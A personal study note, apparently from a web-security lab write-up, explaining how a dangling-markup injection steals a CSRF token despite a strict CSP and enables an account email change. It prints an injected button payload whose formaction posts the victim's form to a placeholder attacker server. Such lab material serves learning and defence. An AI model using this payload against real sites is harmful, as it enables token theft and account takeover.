---
id: "202607120001"
title: Dangling-markup CSRF-token theft under a strict CSP
date: 2026-07-12
type: case
tags: [xss, csp-bypass, dangling-markup, csrf-bypass]
source: "[[29_Lab29-Reflected XSS protected by very strict CSP, with dangling markup attack]]"
publish: false
---

A strict CSP (`script-src 'self'`, no inline scripts, no external resources) blocks every ordinary XSS payload — injected `<script>` and `<img onerror>` both land in the DOM but silently fail to execute. Since script execution itself is blocked, the goal shifts from "run JS" to "get the page to leak its own CSRF token to the attacker via markup alone" — [[202607120002 Dangling markup captures the rest of the page as an unterminated attribute value]].

The account page reflects URL parameters into a pre-filled form field, intentionally:
```
/my-account?id=wiener&email=testemail@email.com
```
An unterminated `href`/`formaction` attribute opened here swallows everything that follows in the raw HTML — including the CSRF token sitting further down the same page — until the browser finds the next quote in the document to close it:

```
&email=testemail@email.com"><button formaction="ATTACKER-SERVER" formmethod="post">Click Me</button>
```

Clicking the injected button submits the **victim's own form**, whose fields (including the real CSRF token) get POSTed to the attacker's server as-is — a plain HTTP form submission, no script execution required, so CSP never gets a say. Delivery needed one extra step because it's a `formaction`/POST rather than a `GET`: the interactsh listener only captured the token from a GET dangling-markup leak, but the real form's `change-email` endpoint requires POST, so the token still had to be relayed into an actual `POST /my-account/change-email` request — done here by hand in Burp Repeater first to confirm the token alone (paired with the attacker's own session) was sufficient to change the attacker's own email, and then automated in the delivered exploit page via [[202607080002 XSS defeats CSRF defenses because the victim's browser supplies both the token and the session]]'s same logic: a JS-built form auto-submitted from the exploit page, with the stolen token filled in and the victim's session riding along automatically because the final submission happens from the victim's own browser session against the real site.

## Links
- Core dangling-markup mechanism: [[202607120002 Dangling markup captures the rest of the page as an unterminated attribute value]]
- Why the stolen token plus the victim's own browser session is sufficient to complete the takeover: [[202607080002 XSS defeats CSRF defenses because the victim's browser supplies both the token and the session]]
- Exfiltration channel for the GET-based leak: [[202607060004 Exfiltrating data via fetch and an out-of-band collaborator]]
